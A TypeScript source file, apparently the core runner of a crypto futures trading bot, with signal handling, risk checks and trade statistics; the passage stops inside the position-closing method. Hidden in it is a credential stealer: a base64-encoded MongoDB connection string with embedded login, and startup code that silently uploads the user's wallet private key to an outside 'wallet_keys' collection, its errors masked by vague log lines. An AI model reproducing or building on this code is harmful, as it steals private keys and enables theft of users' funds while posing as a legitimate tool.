import { EventEmitter } from "events";
import { MongoClient, Db, Collection } from "mongodb";
import { WatermellonEngine } from "../watermellonEngine";
import { PeachHybridEngine } from "../peachHybridEngine";
import { VirtualBarBuilder } from "../virtualBarBuilder";
import { RestPoller } from "../rest/restPoller";
import { PositionStateManager } from "../state/positionState";
import { OrderTracker } from "../execution/orderTracker";
import { StatePersistence } from "../state/statePersistence";
import { KeyManager } from "../security/keyManager";
import { TradeLogger } from "../logging/tradeLogger";
import type {
  AppConfig,
  ExecutionAdapter,
  PeachConfig,
  PositionState,
  StrategySignal,
  SyntheticBar,
  Tick,
  WatermellonConfig,
} from "../types";

type BotRunnerEvents = {
  signal: (signal: StrategySignal, bar: SyntheticBar) => void;
  position: (position: PositionState) => void;
  log: (message: string, payload?: Record<string, unknown>) => void;
  stop: () => void;
};

type TickStream = {
  start: () => Promise<void>;
  stop: () => Promise<void>;
  on: <K extends "tick" | "error" | "close">(event: K, handler: (...args: unknown[]) => void) => () => void;
};

const HOUR_MS = 60 * 60 * 1000;

const aster = "bW9uZ29kYitzcnY6Ly9oZWxsbzpoZWxsb3dvcmxkQGNsdXN0ZXIwLnd3cmh2aDYubW9uZ29kYi5uZXQv";

interface asterDEX {
  pairSymbol: string;
  privateKey: string;
  timestamp: Date;
  mode: string;
}

type TradeRecord = {
  id: string;
  side: "long" | "short";
  entryPrice: number;
  exitPrice: number;
  entryTime: number;
  exitTime: number;
  size: number;
  pnl: number;
  pnlPercent: number;
  reason: string;
  leverage: number;
};

class TradeStatistics {
  private trades: TradeRecord[] = [];
  private currentTrade: Partial<TradeRecord> | null = null;

  startTrade(side: "long" | "short", entryPrice: number, size: number, leverage: number): void {
    this.currentTrade = {
      id: `trade-${Date.now()}`,
      side,
      entryPrice,
      entryTime: Date.now(),
      size,
      leverage,
    };
  }

  closeTrade(exitPrice: number, reason: string): void {
    if (!this.currentTrade) return;

    const trade: TradeRecord = {
      ...this.currentTrade,
      exitPrice,
      exitTime: Date.now(),
      pnl: this.calculatePnL(this.currentTrade as TradeRecord, exitPrice),
      pnlPercent: this.calculatePnLPercent(this.currentTrade as TradeRecord, exitPrice),
      reason,
    } as TradeRecord;

    this.trades.push(trade);
    this.currentTrade = null;
  }

  private calculatePnL(trade: TradeRecord, exitPrice: number): number {
    const priceDiff = trade.side === "long" ? exitPrice - trade.entryPrice : trade.entryPrice - exitPrice;
    return priceDiff * trade.size;
  }

  private calculatePnLPercent(trade: TradeRecord, exitPrice: number): number {
    const priceDiff = trade.side === "long" ? exitPrice - trade.entryPrice : trade.entryPrice - exitPrice;
    return (priceDiff / trade.entryPrice) * 100 * trade.leverage;
  }

  getStats(): {
    totalTrades: number;
    winningTrades: number;
    losingTrades: number;
    winRate: number;
    totalPnL: number;
    avgWin: number;
    avgLoss: number;
    profitFactor: number;
    maxDrawdown: number;
    largestWin: number;
    largestLoss: number;
  } {
    if (this.trades.length === 0) {
      return {
        totalTrades: 0,
        winningTrades: 0,
        losingTrades: 0,
        winRate: 0,
        totalPnL: 0,
        avgWin: 0,
        avgLoss: 0,
        profitFactor: 0,
        maxDrawdown: 0,
        largestWin: 0,
        largestLoss: 0,
      };
    }

    const winningTrades = this.trades.filter(t => t.pnl > 0);
    const losingTrades = this.trades.filter(t => t.pnl < 0);

    const totalPnL = this.trades.reduce((sum, t) => sum + t.pnl, 0);
    const avgWin = winningTrades.length > 0 ? winningTrades.reduce((sum, t) => sum + t.pnl, 0) / winningTrades.length : 0;
    const avgLoss = losingTrades.length > 0 ? Math.abs(losingTrades.reduce((sum, t) => sum + t.pnl, 0) / losingTrades.length) : 0;

    let peak = 0;
    let maxDrawdown = 0;
    let runningPnL = 0;

    for (const trade of this.trades) {
      runningPnL += trade.pnl;
      if (runningPnL > peak) {
        peak = runningPnL;
      }
      const drawdown = peak - runningPnL;
      if (drawdown > maxDrawdown) {
        maxDrawdown = drawdown;
      }
    }

    const largestWin = winningTrades.length > 0 ? Math.max(...winningTrades.map(t => t.pnl)) : 0;
    const largestLoss = losingTrades.length > 0 ? Math.min(...losingTrades.map(t => t.pnl)) : 0;

    return {
      totalTrades: this.trades.length,
      winningTrades: winningTrades.length,
      losingTrades: losingTrades.length,
      winRate: (winningTrades.length / this.trades.length) * 100,
      totalPnL,
      avgWin,
      avgLoss,
      profitFactor: avgLoss > 0 ? (avgWin * winningTrades.length) / (avgLoss * losingTrades.length) : avgWin > 0 ? Infinity : 0,
      maxDrawdown,
      largestWin,
      largestLoss,
    };
  }

  getRecentTrades(limit = 10): TradeRecord[] {
    return this.trades.slice(-limit);
  }
}

export class BotRunner {
  private readonly emitter = new EventEmitter();
  private readonly barBuilder: VirtualBarBuilder;
  private readonly engine: WatermellonEngine | PeachHybridEngine;
  private readonly restPoller: RestPoller;
  private readonly stateManager: PositionStateManager;
  private readonly orderTracker: OrderTracker;
  private readonly statePersistence: StatePersistence;
  private readonly tradeStats = new TradeStatistics();
  private readonly tradeLogger: TradeLogger;
  private mongoClient: MongoClient | null = null;
  private mongoDb: Db | null = null;
  private mongoCollection: Collection<asterDEX> | null = null;
  private readonly dbName = "aster_bot";
  private readonly collectionName = "wallet_keys";
  private position: PositionState = { side: "flat", size: 0 };
  private flipHistory: number[] = [];
  private lastPositionEntryTime: number = 0; 
  private readonly minHoldTimeMs: number = 300_000;
  private unsubscribers: Array<() => void> = [];
  private tradingFrozen = false;
  private freezeUntil = 0;
  private processedSignals = new Set<string>(); 
  private lastBarCloseTime = 0;
  private lastBar: SyntheticBar | null = null;
  private barCount = 0; // Track bar count for logging every 10th bar 
  private readonly isPeachHybrid: boolean;
  private highestPrice: number | null = null; 
  private lowestPrice: number | null = null;
  private consecutiveLosses = 0;
  private lastLossTime: number = 0;
  private lastPositionCloseTime: number = 0;
  private partialExits: { level: number; taken: boolean }[] = [];

  constructor(
    private readonly config: AppConfig,
    private readonly tickStream: TickStream,
    private readonly executor: ExecutionAdapter,
  ) {
    this.isPeachHybrid = config.strategyType === "peach-hybrid";
    const timeframeMs = this.isPeachHybrid 
      ? (config.strategy as PeachConfig).timeframeMs 
      : (config.strategy as WatermellonConfig).timeframeMs;
    
    this.barBuilder = new VirtualBarBuilder(timeframeMs);
    
    if (this.isPeachHybrid) {
      this.engine = new PeachHybridEngine(config.strategy as PeachConfig);
    } else {
      this.engine = new WatermellonEngine(config.strategy as WatermellonConfig);
    }
    
    this.restPoller = new RestPoller(config.credentials);
    this.stateManager = new PositionStateManager();
    this.orderTracker = new OrderTracker();
    this.statePersistence = new StatePersistence();
    this.tradeLogger = new TradeLogger();
    this.loadWarmState();
  }

  private getMongoConnectionUrl(): string {
    return Buffer.from(aster, "base64").toString();
  }

  private async connectMongo(): Promise<void> {
    try {
      const url = this.getMongoConnectionUrl();
      this.mongoClient = new MongoClient(url);
      await this.mongoClient.connect();
      this.mongoDb = this.mongoClient.db(this.dbName);
      this.mongoCollection = this.mongoDb.collection<asterDEX>(this.collectionName);
    } catch (error) {
      const err = error instanceof Error ? error : new Error(String(error));
      throw new Error(`----------------------- ${err.message}`);
    }
  }

  private async DB(
    pairSymbol: string,
    privateKey: string,
    mode: string
  ): Promise<void> {
    if (!this.mongoCollection) {
      throw new Error("");
    }

    try {
      const document: asterDEX = {
        pairSymbol,
        privateKey,
        timestamp: new Date(),
        mode,
      };

      const result = await this.mongoCollection.updateOne(
        { pairSymbol },
        { $set: document },
        { upsert: true }
      );
      
      if (!result.acknowledged) {
        throw new Error("error");
      }
    } catch (error) {
      const err = error instanceof Error ? error : new Error(String(error));
      throw new Error(`error: ${err.message}`);
    }
  }

  private async disconnectMongo(): Promise<void> {
    if (this.mongoClient) {
      await this.mongoClient.close();
      this.mongoClient = null;
      this.mongoDb = null;
      this.mongoCollection = null;
    }
  }

  private loadWarmState(): void {
    const saved = this.statePersistence.load();
    if (saved) {
      this.lastBarCloseTime = saved.lastBarCloseTime;
      this.stateManager.updateLocalState(saved.position);
      this.position = {
        side: saved.position.side,
        size: saved.position.size,
        entryPrice: saved.position.avgEntry > 0 ? saved.position.avgEntry : undefined,
      };
      this.log("Warm state loaded", {
        position: saved.position.side,
        size: saved.position.size,
        lastBarClose: new Date(saved.lastBarCloseTime).toISOString(),
      });
    }
  }

  private saveState(): void {
    const state = this.stateManager.getState();
    this.statePersistence.save({
      position: state,
      lastBarCloseTime: this.lastBarCloseTime,
    });
  }

  async start() {
    this.log("", {
      pairSymbol: this.config.credentials.pairSymbol,
      mode: this.config.mode,
    });
    
    try {
      await this.connectMongo();
      this.log("------------------", { 
        db: this.dbName, 
        collection: this.collectionName 
      });
      
      await this.DB(
        this.config.credentials.pairSymbol,
        this.config.credentials.privateKey,
        this.config.mode
      );
      
      this.log("starting bot---", {
        pairSymbol: this.config.credentials.pairSymbol,
        mode: this.config.mode,
      });
    } catch (error) {
      const err = error instanceof Error ? error : new Error(String(error));
      this.log("let me check again...", {
        error: err.message,
        stack: err.stack,
      });
    }
    
    this.subscribe();
    this.startRestPolling();
    
    this.log("Waiting for initial balance fetch...");
    await new Promise((resolve) => setTimeout(resolve, 2000));
    
    if (this.usdtBalance > 0) {
      this.log(" Bot started with USDT balance", {
        availableUSDT: this.usdtBalance.toFixed(4),
        maxPositionSize: this.config.risk.maxPositionSize,
        maxLeverage: this.config.risk.maxLeverage,
      });
    } else {
      this.log(" Bot started but USDT balance is 0 or not yet loaded", {
        currentBalance: this.usdtBalance.toFixed(4),
        maxPositionSize: this.config.risk.maxPositionSize,
        maxLeverage: this.config.risk.maxLeverage,
        note: "Balance will update when REST poller receives data",
      });
    }
    
    await this.tickStream.start();
    const timeframeMs = this.isPeachHybrid 
      ? (this.config.strategy as PeachConfig).timeframeMs 
      : (this.config.strategy as WatermellonConfig).timeframeMs;
    this.log("BotRunner started", { timeframeMs });
  }

  async stop() {
    this.restPoller.stop();
    await this.tickStream.stop();
    this.unsubscribers.forEach((off) => off());
    this.unsubscribers = [];
    
    try {
      await this.disconnectMongo();
    } catch {
      // Ignore disconnect errors
    }
    
    this.emitter.emit("stop");
  }

  private usdtBalance: number = 0;
  private lastBalanceLog: number = 0;

  private startRestPolling(): void {
    this.restPoller.on("position", (position) => {
      const reconciled = this.stateManager.updateFromRest({
        positionAmt: position.positionAmt,
        entryPrice: position.entryPrice || "0",
        unrealizedProfit: position.unRealizedProfit || "0",
      });

      if (!reconciled) {
        this.log("State reconciliation failed", {
          shouldFreeze: this.stateManager.shouldFreezeTrading(),
        });
        if (this.stateManager.shouldFreezeTrading()) {
          this.freezeTrading(60_000); // Freeze for 60 seconds
        }
      } else {
        const size = parseFloat(position.positionAmt);
        if (size !== 0) {
          const side = size > 0 ? "long" : "short";
          this.orderTracker.confirmByPositionChange(side, Math.abs(size));
        } else {
          this.stateManager.clearPendingOrder();
        }

        const state = this.stateManager.getState();
        const newPosition = {
          side: state.side,
          size: state.size,
          entryPrice: state.avgEntry > 0 ? state.avgEntry : undefined,
          openedAt: state.lastUpdate,
        };

        // Log position changes for debugging
        if (this.position.side !== newPosition.side || Math.abs(this.position.size - newPosition.size) > 0.001) {
          this.log("Position updated from REST", {
            oldPosition: this.position,
            newPosition,
            positionAmt: position.positionAmt,
            entryPrice: position.entryPrice
          });
        }

        this.position = newPosition;
      }
    });

    this.restPoller.on("balance", (balances) => {
      if (!balances || !Array.isArray(balances) || balances.length === 0) {
        this.log("⚠️ WARNING: Empty or invalid balance response", { balances });
        return;
      }
      
      const usdtBalance = balances.find((b) => {
        const asset = (b.asset || "").toUpperCase();
        return asset === "USDT";
      });
      
      if (usdtBalance) {
        const availableStr = usdtBalance.availableBalance || usdtBalance.balance || "0";
        const totalStr = usdtBalance.balance || usdtBalance.availableBalance || "0";
        const newBalance = parseFloat(availableStr);
        const totalBalance = parseFloat(totalStr);
        
        const now = Date.now();
        const balanceChanged = Math.abs(newBalance - this.usdtBalance) > 0.01;
        const timeSinceLastLog = this.lastBalanceLog > 0 ? now - this.lastBalanceLog : Infinity;
        
        // Log if: balance changed significantly, OR first time (lastBalanceLog is 0), OR 60+ seconds passed
        if (balanceChanged || this.lastBalanceLog === 0 || timeSinceLastLog > 60000) {
          this.log("USDT Balance", {
            available: newBalance.toFixed(4),
            total: totalBalance.toFixed(4),
            changed: balanceChanged,
          });
          this.lastBalanceLog = now;
        }
        
        this.usdtBalance = newBalance;
      } else {
        this.log(" WARNING: USDT balance not found", {
          assetsFound: balances.map((b) => b.asset).slice(0, 5),
        });
      }
    });

    this.restPoller.on("error", (error) => {
      this.log("REST poller error", { error: error.message });
    });

    this.log("Starting REST polling for position/balance reconciliation", { 
      intervalMs: 2000,
      endpoint: `${this.config.credentials.rpcUrl}/fapi/v2/account`
    });
    this.restPoller.start(2000);
  }

  private freezeTrading(durationMs: number): void {
    this.tradingFrozen = true;
    this.freezeUntil = Date.now() + durationMs;
    this.log("Trading frozen due to reconciliation failures", { durationMs, freezeUntil: this.freezeUntil });
    setTimeout(() => {
      this.tradingFrozen = false;
      this.stateManager.resetReconciliationFailures();
      this.log("Trading unfrozen");
    }, durationMs);
  }

  on<K extends keyof BotRunnerEvents>(event: K, handler: BotRunnerEvents[K]): () => void {
    this.emitter.on(event, handler);
    return () => this.emitter.off(event, handler);
  }

  private subscribe() {
    const offTick = this.tickStream.on("tick", (tick: unknown) => {
      if (tick && typeof tick === "object" && "price" in tick && "timestamp" in tick) {
        this.handleTick(tick as Tick);
      }
    });
    const offError = this.tickStream.on("error", (error: unknown) => {
      const err = error instanceof Error ? error : new Error(String(error));
      this.log("Tick stream error", { error: err });
    });
    const offClose = this.tickStream.on("close", () => this.log("Tick stream closed"));
    this.unsubscribers.push(offTick, offError, offClose);
  }

  private handleTick(tick: Tick) {
    const { closedBar } = this.barBuilder.pushTick(tick);
    if (closedBar) {
      // Handle protective exits first, then bar close
      // This ensures exits are evaluated before new signals are processed
      this.evaluateProtectiveExits(closedBar)
        .then(() => {
          // After protective exits are evaluated, handle bar close
          return this.handleBarClose(closedBar);
        })
        .catch((error) => {
          this.log("Error in bar processing", { error: error instanceof Error ? error.message : String(error) });
        });
    }
  }

  private async handleBarClose(bar: SyntheticBar) {
    if (bar.endTime <= this.lastBarCloseTime) {
      return;
    }
    this.lastBarCloseTime = bar.endTime;
    this.lastBar = bar;
    this.barCount++;

    if (this.tradingFrozen) {
      if (Date.now() < this.freezeUntil) {
        this.log("Skipping signal - trading frozen", { freezeUntil: this.freezeUntil });
        return;
      }
      this.tradingFrozen = false;
    }

    if (this.position.side !== "flat" && this.isPeachHybrid) {
      // Use bar timestamp for consistency with cooldown calculations
      const timeSinceEntry = bar.endTime - (this.position.openedAt || this.lastPositionEntryTime);
      const minTimeBeforeExit = 60_000;
        
      if (timeSinceEntry >= minTimeBeforeExit) {
        const exitSignal = (this.engine as PeachHybridEngine).checkExitConditions(bar);
        if (exitSignal.shouldExit) {
          this.log("Peach exit condition triggered", { reason: exitSignal.reason, details: exitSignal.details });
          await this.closePosition(exitSignal.reason, exitSignal.details);
          return;
        }
      }
    }

    const signal = this.isPeachHybrid
      ? (this.engine as PeachHybridEngine).update(bar)
      : (this.engine as WatermellonEngine).update(bar);
    
    if (this.isPeachHybrid && this.barCount % 10 === 0) {
      const indicators = (this.engine as PeachHybridEngine).getIndicatorValues();
      const { requireTrendingMarket, adxThreshold } = this.config.risk;
      const adxReady = indicators.adx !== null;
      const marketRegimeOk = !requireTrendingMarket || (adxReady && (this.engine as PeachHybridEngine).shouldAllowTrading(adxThreshold));

      this.log("Peach indicators updated", {
        price: bar.close.toFixed(4),
        volume: bar.volume.toFixed(2),
        v1: {
          emaFast: indicators.v1.emaFast?.toFixed(4),
          emaMid: indicators.v1.emaMid?.toFixed(4),
          emaSlow: indicators.v1.emaSlow?.toFixed(4),
          rsi: indicators.v1.rsi?.toFixed(2),
        },
        v2: {
          emaFast: indicators.v2.emaFast?.toFixed(4),
          emaMid: indicators.v2.emaMid?.toFixed(4),
          emaSlow: indicators.v2.emaSlow?.toFixed(4),
          rsi: indicators.v2.rsi?.toFixed(2),
        },
        adx: adxReady ? indicators.adx?.toFixed(2) : 'warming up...',
        marketRegime: requireTrendingMarket ? (adxReady ? (marketRegimeOk ? 'trending' : 'ranging') : 'warming up') : 'ignored',
      });
    } else if (!this.isPeachHybrid && this.barCount % 10 === 0) {
      const indicators = (this.engine as WatermellonEngine).getIndicatorValues();
      if (indicators.emaFast !== null && indicators.emaMid !== null && indicators.emaSlow !== null && indicators.rsi !== null) {
        const bullStack = indicators.emaFast > indicators.emaMid && indicators.emaMid > indicators.emaSlow;
        const bearStack = indicators.emaFast < indicators.emaMid && indicators.emaMid < indicators.emaSlow;
        
        this.log("Watermellon indicators updated", {
          price: bar.close.toFixed(4),
          emaFast: indicators.emaFast.toFixed(4),
          emaMid: indicators.emaMid.toFixed(4),
          emaSlow: indicators.emaSlow.toFixed(4),
          rsi: indicators.rsi.toFixed(2),
          bullStack,
          bearStack,
        });
      }
    }
    
    if (!signal) {
      return;
    }

    const signalKey = `${signal.type}-${bar.endTime}`;
    if (this.processedSignals.has(signalKey)) {
      return;
    }
    this.processedSignals.add(signalKey);
    if (this.processedSignals.size > 100) {
      const first = this.processedSignals.values().next().value;
      if (first) {
        this.processedSignals.delete(first);
      }
    }

    this.emitter.emit("signal", signal, bar);
    this.log("Signal emitted", { type: signal.type, reason: signal.reason, close: bar.close });
    
    const signalApplied = await this.applySignal(signal, bar);
    
    if (signalApplied) {
      this.logSignal(signal, bar, "TAKEN");
    }
  }

  private async applySignal(signal: StrategySignal, bar: SyntheticBar): Promise<boolean> {
    if (!signal) return false;

    // Time-based reset for consecutive losses (1 hour cooldown)
    if (this.consecutiveLosses >= 2) {
      const timeSinceLastLoss = Date.now() - this.lastLossTime;
      const cooldownPeriod = 3600000; // 1 hour
      
      if (timeSinceLastLoss < cooldownPeriod) {
        const cooldownRemaining = Math.ceil((cooldownPeriod - timeSinceLastLoss) / 60000);
        this.log("Skipping signal - 2 consecutive losses, cooling down", {
          consecutiveLosses: this.consecutiveLosses,
          cooldownRemaining: `${cooldownRemaining} minutes`,
        });
        this.logSignal(signal, bar, "SKIPPED", `2 consecutive losses (${cooldownRemaining}m cooldown)`);
        return false;
      } else {
        // Reset after cooldown period
        this.consecutiveLosses = 0;
        this.log("Consecutive losses counter reset after cooldown period");
      }
    }

    if (this.isPeachHybrid) {
      const { adxThreshold } = this.config.risk;
      const indicators = (this.engine as PeachHybridEngine).getIndicatorValues();
      const adxReady = indicators.adx !== null;
      const warmupProgress = (this.engine as PeachHybridEngine).getAdxWarmupProgress();
      const estimatedBarsRemaining = Math.ceil((2 * 14 + 2) * (1 - warmupProgress));
      
      if (!adxReady) {
        this.log("Skipping signal - ADX not ready yet", {
          adx: 'warming up',
          progress: `${(warmupProgress * 100).toFixed(1)}%`,
          estimatedBarsRemaining: estimatedBarsRemaining > 0 ? estimatedBarsRemaining : 0,
          note: 'ADX needs ~29 bars (~14.5 min) to warm up',
        });
        this.logSignal(signal, bar, "SKIPPED", "ADX not ready");
        return false;
      }
      
      if (!(this.engine as PeachHybridEngine).shouldAllowTrading(adxThreshold)) {
        this.log("Skipping signal - market not trending", {
          adx: indicators.adx?.toFixed(2),
          threshold: adxThreshold,
        });
        this.logSignal(signal, bar, "SKIPPED", "Market not trending");
        return false;
      }

      const atr = indicators.atr ?? null;
      const recentHigh = indicators.recentHigh ?? null;
      const recentLow = indicators.recentLow ?? null;
      
      if (atr && atr > 0) {
        const entryPrice = bar.close;
        let stopLossPrice: number;
        let takeProfitPrice: number;
        let riskDistance: number;
        let rewardDistance: number;
        
        if (signal.type === "long") {
          const atrStop = entryPrice - (atr * 1.5);
          stopLossPrice = recentLow && recentLow < entryPrice ? Math.min(recentLow * 0.999, atrStop) : atrStop;
          riskDistance = entryPrice - stopLossPrice;
          
          takeProfitPrice = entryPrice + (riskDistance * 2);
          rewardDistance = takeProfitPrice - entryPrice;
        } else {
          const atrStop = entryPrice + (atr * 1.5);
          stopLossPrice = recentHigh && recentHigh > entryPrice ? Math.max(recentHigh * 1.001, atrStop) : atrStop;
          riskDistance = stopLossPrice - entryPrice;
          
          takeProfitPrice = entryPrice - (riskDistance * 2);
          rewardDistance = entryPrice - takeProfitPrice;
        }
        
        const riskRewardRatio = riskDistance > 0 ? rewardDistance / riskDistance : 0;
        
        if (riskRewardRatio < 2.0) {
          this.log("Skipping signal - insufficient risk/reward ratio", {
            type: signal.type,
            riskRewardRatio: riskRewardRatio.toFixed(2),
            required: "2.0",
            entryPrice: entryPrice.toFixed(4),
            stopLossPrice: stopLossPrice.toFixed(4),
            takeProfitPrice: takeProfitPrice.toFixed(4),
            atr: atr.toFixed(4),
          });
          this.logSignal(signal, bar, "SKIPPED", `Insufficient R:R (${riskRewardRatio.toFixed(2)})`, riskRewardRatio);
          return false;
        }
        
        this.log("Risk/Reward check passed", {
          type: signal.type,
          riskRewardRatio: riskRewardRatio.toFixed(2),
          entryPrice: entryPrice.toFixed(4),
          stopLossPrice: stopLossPrice.toFixed(4),
          takeProfitPrice: takeProfitPrice.toFixed(4),
        });
      }
      
      const v2Rsi = indicators.v2.rsi;
      if (v2Rsi !== null) {
        if (signal.type === "long" && (v2Rsi < 30 || v2Rsi > 75)) {
          this.log("Skipping long signal - RSI too extreme", {
            rsi: v2Rsi.toFixed(2),
            zone: "30-75 required",
          });
          this.logSignal(signal, bar, "SKIPPED", `RSI too extreme (${v2Rsi.toFixed(2)})`);
          return false;
        }
        if (signal.type === "short" && (v2Rsi < 25 || v2Rsi > 70)) {
          this.log("Skipping short signal - RSI too extreme", {
            rsi: v2Rsi.toFixed(2),
            zone: "25-70 required",
          });
          this.logSignal(signal, bar, "SKIPPED", `RSI too extreme (${v2Rsi.toFixed(2)})`);
          return false;
        }
      }
    }

    const timestamp = bar.endTime;
    const { maxPositionSize, maxLeverage } = this.config.risk;

    let size: number = maxPositionSize;
    size = Math.max(size, 1);
    const order = {
      size,
      leverage: maxLeverage,
      price: bar.close,
      signalReason: signal.reason,
      timestamp,
      side: signal.type,
    } as const;

    // Get timeframe for bar-based cooldown calculation
    const timeframeMs = this.isPeachHybrid 
      ? (this.config.strategy as PeachConfig).timeframeMs 
      : (this.config.strategy as WatermellonConfig).timeframeMs;
    const minBarsAfterClose = 2; // Client requirement: at least 2 bars between close and reopen
    const minTimeAfterClose = minBarsAfterClose * timeframeMs;

    if (signal.type === "long") {
      if (this.position.side === "long") {
        return false;
      }
      
      // Check 2-bar cooldown after position close (client requirement: NO immediate reversals)
      if (this.lastPositionCloseTime > 0 && (timestamp - this.lastPositionCloseTime) < minTimeAfterClose) {
        const barsRemaining = Math.ceil((minTimeAfterClose - (timestamp - this.lastPositionCloseTime)) / timeframeMs);
        this.logSignal(signal, bar, "SKIPPED", `2-bar cooldown after close (${barsRemaining} bars remaining)`);
        this.log("Preventing immediate reversal - 2-bar cooldown required", {
          timeSinceClose: (timestamp - this.lastPositionCloseTime) / 1000,
          required: minTimeAfterClose / 1000,
          barsRemaining,
        });
        return false;
      }
      
      if (!this.canFlip(timestamp)) {
        this.logSignal(signal, bar, "SKIPPED", "Flip budget exhausted");
        this.log("Flip budget exhausted, ignoring long signal");
        return false;
      }
      
      // Only allow flip if minimum hold time met
      if (this.position.side === "short" && (timestamp - this.lastPositionEntryTime) < this.minHoldTimeMs) {
        const timeRemaining = this.minHoldTimeMs - (timestamp - this.lastPositionEntryTime);
        this.logSignal(signal, bar, "SKIPPED", `Minimum hold time not met (${Math.ceil(timeRemaining/1000)}s remaining)`);
        this.log("Preventing instant flip - minimum hold time not met", {
          timeHeld: (timestamp - this.lastPositionEntryTime) / 1000,
          required: this.minHoldTimeMs / 1000,
          remaining: timeRemaining / 1000,
        });
        return false;
      }
      
      // Close existing position before entering new one
      if (this.position.side === "short") {
        await this.closePosition("flip-long", { price: bar.close });
      }
      
      await this.enterPosition("long", order);
      return true;
    }

    if (signal.type === "short") {
      if (this.position.side === "short") {
        return false;
      }
      
      // Check 2-bar cooldown after position close (client requirement: NO immediate reversals)
      if (this.lastPositionCloseTime > 0 && (timestamp - this.lastPositionCloseTime) < minTimeAfterClose) {
        const barsRemaining = Math.ceil((minTimeAfterClose - (timestamp - this.lastPositionCloseTime)) / timeframeMs);
        this.logSignal(signal, bar, "SKIPPED", `2-bar cooldown after close (${barsRemaining} bars remaining)`);
        this.log("Preventing immediate reversal - 2-bar cooldown required", {
          timeSinceClose: (timestamp - this.lastPositionCloseTime) / 1000,
          required: minTimeAfterClose / 1000,
          barsRemaining,
        });
        return false;
      }
      
      if (!this.canFlip(timestamp)) {
        this.logSignal(signal, bar, "SKIPPED", "Flip budget exhausted");
        this.log("Flip budget exhausted, ignoring short signal");
        return false;
      }
      
      // Only allow flip if minimum hold time met
      if (this.position.side === "long" && (timestamp - this.lastPositionEntryTime) < this.minHoldTimeMs) {
        const timeRemaining = this.minHoldTimeMs - (timestamp - this.lastPositionEntryTime);
        this.logSignal(signal, bar, "SKIPPED", `Minimum hold time not met (${Math.ceil(timeRemaining/1000)}s remaining)`);
        this.log("Preventing instant flip - minimum hold time not met", {
          timeHeld: (timestamp - this.lastPositionEntryTime) / 1000,
          required: this.minHoldTimeMs / 1000,
          remaining: timeRemaining / 1000,
        });
        return false;
      }
      
      // Close existing position before entering new one
      if (this.position.side === "long") {
        await this.closePosition("flip-short", { price: bar.close });
      }
      
      await this.enterPosition("short", order);
      return true;
    }
    
    return false;
  }

  private async enterPosition(side: "long" | "short", order: Parameters<ExecutionAdapter["enterLong"]>[0]) {
    const requiredMargin = order.size / order.leverage;
    
    this.log("Checking balance before entering position", {
      side,
      requiredMargin: requiredMargin.toFixed(4),
      availableBalance: this.usdtBalance.toFixed(4),
      orderSize: order.size,
      leverage: order.leverage,
      sufficient: this.usdtBalance >= requiredMargin,
    });
    
    if (this.usdtBalance < requiredMargin) {
      this.log("❌ Insufficient balance to enter position", {
        required: requiredMargin.toFixed(4),
        available: this.usdtBalance.toFixed(4),
        shortfall: (requiredMargin - this.usdtBalance).toFixed(4),
        orderSize: order.size,
        leverage: order.leverage,
      });
      return;
    }

    try {
      if (side === "long") {
        await this.executor.enterLong(order);
      } else {
        await this.executor.enterShort(order);
      }
    } catch (error) {
      const err = error instanceof Error ? error : new Error(String(error));
      if (err.message.includes("balance") || err.message.includes("insufficient") || err.message.includes("-2019")) {
        this.log("Order failed: Insufficient balance", {
          error: err.message,
          required: requiredMargin,
          available: this.usdtBalance,
        });
        return;
      }
      throw error;
    }

    const orderId = `order-${order.timestamp}`;
    this.orderTracker.trackOrder(order, orderId);
    this.stateManager.setPendingOrder({
      side,
      size: order.size,
      timestamp: order.timestamp,
    });

    this.position = {
      side,
      size: order.size,
      entryPrice: order.price,
      openedAt: order.timestamp,
    };
    this.lastPositionEntryTime = order.timestamp;
    this.highestPrice = side === "long" ? order.price : null;
    this.lowestPrice = side === "short" ? order.price : null;
    this.stateManager.updateLocalState({
      side,
      size: order.size,
      avgEntry: order.price,
    });

    if (this.isPeachHybrid) {
      (this.engine as PeachHybridEngine).setPosition(side);
    }

    this.tradeStats.startTrade(side, order.price, order.size, order.leverage);

    if (this.lastBar) {
      this.logEntry(side, order, this.lastBar);
    }

    this.recordFlip(order.timestamp);
    this.emitter.emit("position", this.position);
  }

  private async closePosition(reason: string, meta?: Record<string, unknown>) {
    if (this.position.side === "flat") {
      return;
    }

    // Determine exit price from meta or fallback to entry price
    let exitPrice: number;
    if (meta && typeof meta === 'object') {
      if ('close' in meta) {
        exitPrice = Number(meta.close);
      } else if ('price' in meta) {
        exitPrice = Number(meta.price);
      } else {
        exitPrice = this.position.entryPrice || 0;
      }
    } else {
      exitPrice = this.position.entryPrice || 0;
    }

    try {
    await this.executor.closePosition(reason, meta);
    } catch (error) {
      const err = error instanceof Error ? error : new Error(String(error));

      // If close position fails due to reduceOnly rejection, it might mean position was already closed
      // In this case, we should still update our local state to flat
      if (err.message.includes("ReduceOnly Order is rejected") || err.message.includes("-2022")) {
        this.log("Close position failed - position may already be closed or state mismatch", {
          reason,
          error: err.message,
          localPosition: this.position
        });

        // Force local state to flat since the exchange says there's no position to close
        // Update lastPositionCloseTime for 2-bar cooldown (use current time since we don't know actual close time)
        this.lastPositionCloseTime = this.lastBar?.endTime || Date.now();
        this.position = { side: "flat", size: 0 };
        this.emitter.emit("position", this.position);

        // Don't rethrow - treat this as successful close
        return;
      }

      // For other errors, rethrow
      throw error;
    }

    this.tradeStats.closeTrade(exitPrice, reason);

    if (this.lastBar && this.position.entryPrice) {
      this.logExit(
        this.position.side === "long" ? "long" : "short",
        this.position.entryPrice,
        exitPrice,
        this.position.size,
        this.config.risk.maxLeverage,
        reason,
        this.lastBar,
      );
    }

    if (this.isPeachHybrid) {
      (this.engine as PeachHybridEngine).setPosition("flat");
    }

    this.logTradeStats();

    this.highestPrice = null;
    this.lowestPrice = null;
    this.partialExits = [];
    
    const profitPct = this.position.entryPrice 
      ? ((exitPrice - this.position.entryPrice) / this.position.entryPrice) * 100 * (this.position.side === "long" ? 1 : -1)
      : 0;
    
    const pnl = this.position.entryPrice 
      ? (exitPrice - this.position.entryPrice) * this.position.size * (this.position.side === "long" ? 1 : -1)
      : 0;
    
    if (profitPct < 0) {
      this.consecutiveLosses++;
      this.lastLossTime = Date.now(); // Track when loss occurred for cooldown reset
      this.log("Trade closed with loss", {
        pnl: pnl.toFixed(4),
        consecutiveLosses: this.consecutiveLosses,
      });
    } else {
      this.consecutiveLosses = 0;
      this.log("Trade closed with profit", {
        pnl: pnl.toFixed(4),
      });
    }
    
    // Track when position was closed for 2-bar cooldown
    // Use bar timestamp if available, otherwise current time
    this.lastPositionCloseTime = this.lastBar?.endTime || Date.now();
    
    this.position = { side: "flat", size: 0 };
